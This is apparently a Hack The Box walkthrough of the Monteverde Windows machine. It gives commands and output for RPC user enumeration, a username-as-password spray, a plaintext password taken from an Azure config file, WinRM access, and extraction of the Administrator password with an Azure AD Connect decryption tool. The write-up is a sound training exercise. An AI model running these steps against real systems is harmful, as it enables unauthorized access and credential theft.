---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags: sprayingattack weakpassword bruteforce smbclient rpcclient netexec azure
---

<br />

![1](../../../assets/images/Monteverde/1.png)

<br />

OS -> Windows.

Difficulty -> Medium.

<br />

# Introduction

<br />

Hello hackers! Today we’re tackling the Monteverde Machine, a Medium difficulty Windows box. We’ll begin by enumerating SMB and RPC to extract domain users and conduct a password spraying attack, which yields valid credentials. With them, we explore user shares and discover an Azure configuration file containing another password. This grants us access via WinRM, where we find ourselves as a member of the Azure Admins group. For privilege escalation, we exploit the Azure AD Connect sync service to decrypt stored credentials, ultimately retrieving the Administrator password and fully compromising the machine.

<br />

# Enumeration

<br />

We begin with an aggressive `nmap` full TCP port scan to identify all open ports and enumerate services.

<br />

```bash
❯ nmap -p- 10.10.10.172 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-18 11:41 CEST
Nmap scan report for 10.10.10.172
Host is up (0.042s latency).
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-18 09:41:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49747/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -1m14s
| smb2-time: 
|   date: 2025-07-18T09:42:06
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.76 seconds
```

<br />

Relevant Open Ports:

- `Port 53`   -> dns  

- `Port 88`   -> kerberos  

- `Port 135`  -> rpc  

- `Port 139`  -> netbios  

- `Port 389`  -> ldap  

- `Port 445`  -> smb  

- `Port 464`  -> kpasswd (kerberos password change)  

- `Port 593`  -> rpc over http  

- `Port 636`  -> ldaps  

- `Port 5985` -> winrm  

<br />

The Nmap script shows that the LDAP service reveals the domain name `MEGABANK.LOCAL`.

So we add them to our `/etc/hosts` file:

<br />

```bash
10.10.10.172 MEGABANK.LOCAL
```

<br />

# SMB Enumeration: -> Port 445

<br />

As always, we will start enumerating basic domain information with `netexec`:

<br />

```bash
❯ netexec smb 10.10.10.172
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
```

<br />

In the output, we confirm the domain `MEGABANK.LOCAL` and see that the host is running Windows Server 2019 (Build 17763), which shares its build number with Windows 10.

We attempt a null session (anonymous access) SMB connection to enumerate shares, but `STATUS_ACCESS_DENIED`:

<br />

```bash
❯ netexec smb MEGABANK.LOCAL -u '' -p '' --shares
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
SMB         10.10.10.172    445    MONTEVERDE       [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

<br />

## Rpcclient

<br />

However, anonymous access is allowed via `rpcclient`:

<br />

```bash
❯ rpcclient -U "" MEGABANK.LOCAL -N
rpcclient $> 
```

<br />

Inside, we can enumerate the domain users with the command `enumdomusers`:

<br />

```bash
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

<br />

Then, we put these `usernames` into a file:

<br />

```bash
❯ rpcclient -U "" MEGABANK.LOCAL -N -c "enumdomusers" | grep -oP "\[.*?\]" | grep -v "0x" | tr -d "[]" | sponge users.txt
❯ /usr/bin/cat users.txt
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

<br />

## SMB Spray Attack

<br />

At this point, we can attempt a `spray attack` with these usernames.

While it may seem naive, it's not uncommon for corporate users to use their usernames as passwords.

To perform this attack, we will run `netexec` using the `--continue-on-success` flag. This way, the tool will continue trying all credentials even after a valid match is found.

<br />

```bash
❯ netexec smb MEGABANK.LOCAL -u users.txt -p users.txt --continue-on-success
...[snip]...
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
...[snip]...

```

<br />

We get a single match - valid credentials for the `SABatchJobs` user: `SABatchJobs:SABatchJobs`.

<br />

## SMB Authenticated Enumeration:

<br />

Enumerating the shares available for this user, we find the following:

<br />

```bash
❯ netexec smb MEGABANK.LOCAL -u SABatchJobs -p SABatchJobs --shares
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.10.10.172    445    MONTEVERDE       [*] Enumerated shares
SMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     Remark
SMB         10.10.10.172    445    MONTEVERDE       -----           -----------     ------
SMB         10.10.10.172    445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ            
SMB         10.10.10.172    445    MONTEVERDE       C$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       E$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       users$          READ            
```

<br />

Among the available shares, the most interesting is `users$`, which likely contains user profile directories.

To access it, we can use `smbcclient`:

<br />

```bash
❯ smbclient //MEGABANK.LOCAL/Users$ -U SABatchJobs
Password for [WORKGROUP\SABatchJobs]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  3 14:12:48 2020
  ..                                  D        0  Fri Jan  3 14:12:48 2020
  dgalanos                            D        0  Fri Jan  3 14:12:30 2020
  mhope                               D        0  Fri Jan  3 14:41:18 2020
  roleary                             D        0  Fri Jan  3 14:10:30 2020
  smorgan                             D        0  Fri Jan  3 14:10:24 2020

		31999 blocks of size 4096. 28979 blocks available
```

<br />

And download its content to our local machine for further analysis:

<br >

```bash
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
getting file \mhope\azure.xml of size 1212 as mhope/azure.xml (6,6 KiloBytes/sec) (average 6,6 KiloBytes/sec)
```

<br />

Running `tree`, we see more clearly the content structure:

<br />

```bash
❯ tree
.
├── dgalanos
├── mhope
│   └── azure.xml
├── roleary
└── smorgan

5 directories, 1 file
```

<br />

There is only one file called `azure.xml` inside `mhope's` directory.

Let's see its content:

<br />

```xml
❯ /usr/bin/cat azure.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs
```

<br />

We have a new password: `4n0therD4y@n0th3r$`.

As mentioned earlier, the file was located in `mhope's` directory, so we can try authenticating via `WinRM` as this user:

<br />

```bash
❯ evil-winrm -i MEGABANK.LOCAL -u mhope -p 4n0therD4y@n0th3r$
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents> whoami
megabank\mhope
```

<br />

And get the `user.txt` flag:

<br />

```bash
*Evil-WinRM* PS C:\Users\mhope\Desktop> type user.txt
73e55ef7037471404768494546xxxxxx
```

<br />

# Privilege Escalation: mhope -> Administrator

## Azure

<br />

We noticed hints such as the `azure_uploads` share, which suggest that Azure-related components are present on the system.

<br />

![2](../../../assets/images/Monteverde/2.png)

<br />

If we run net user `mhope`, we can confirm that the user is part of the `Azure Admins` group:

<br />

```bash
*Evil-WinRM* PS C:\Users\mhope\Documents> net user mhope
User name                    mhope
Full Name                    Mike Hope
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 4:40:05 PM
Password expires             Never
Password changeable          1/3/2020 4:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   7/18/2025 3:37:06 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users
The command completed successfully.
```

<br />

The Azure-related components are located under `C:\Program Files`:

<br />

```bash
*Evil-WinRM* PS C:\Program Files> dir *Azure*


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
```

<br />

These folders confirm that `Azure AD Connect` is installed on the system.

<br />

## Azure Exploitation

<br />

[This post](https://vbscrub.video.blog/2020/01/14/azure-ad-connect-database-exploit-priv-esc/) details a known vulnerability in the `Azure AD Connect` database component.

The `Azure AD Connect` service is responsible for synchronizing accounts and credentials between the on-premises Active Directory and Azure AD. The core idea behind the exploit is that we can extract plaintext credentials for the AD account configured within the sync service by running the exploit inside the `zip` of the following [GitHub repository](https://github.com/VbScrub/AdSyncDecrypt/releases).

To proceed, we download the ZIP file and extract its contents:

<br />

```bash
❯ unzip AdDecrypt.zip
Archive:  AdDecrypt.zip
  inflating: AdDecrypt.exe           
  inflating: mcrypt.dll              
```

<br />

Next, we upload both `AdDecrypt.exe` and the required `mcrypt.dll` to the victim machine.

We can do this from our current `evil-winrm` session:

<br />

```bash
*Evil-WinRM* PS C:\users\mhope\Documents> upload AdDecrypt.exe
                                        
Info: Uploading /opt/AdDecrypt.exe to C:\users\mhope\Documents\AdDecrypt.exe
                                        
Data: 19796 bytes of 19796 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\users\mhope\Documents> upload mcrypt.dll
                                        
Info: Uploading /opt/mcrypt.dll to C:\users\mhope\Documents\mcrypt.dll
                                        
Data: 445664 bytes of 445664 bytes copied
                                        
Info: Upload successful!
```

<br />

Finally, we only need to run the `AdDecrypt.exe` binary with the `-FullSQL` flag:

⚠️ Note: It's important to run the binary from `C:\Program Files\Microsoft Azure AD Sync\Bin`, as the exploit relies on local configuration and dependencies that exist only in that directory.

<br />

```bash
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> C:\Users\mhope\Documents\AdDecrypt.exe -FullSQL

======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL
```

<br />

We have credentials for the `Administrator` user: `d0m@in4dminyeah!`

Using `evil-winrm` we can connect as him to the system:

<br />

```bash
❯ evil-winrm -i MEGABANK.LOCAL -u Administrator -p d0m@in4dminyeah!
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
megabank\administrator
```

<br />

And get the `root.txt` flag:

<br />

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
3f6823be538fad63dd83e3a4c9xxxxxx
```

<br />

This was a really interesting Active Directory machine.

Hopefully, this writeup helped you understand the core concepts and techniques involved.

Keep hacking!❤️❤️

<br />
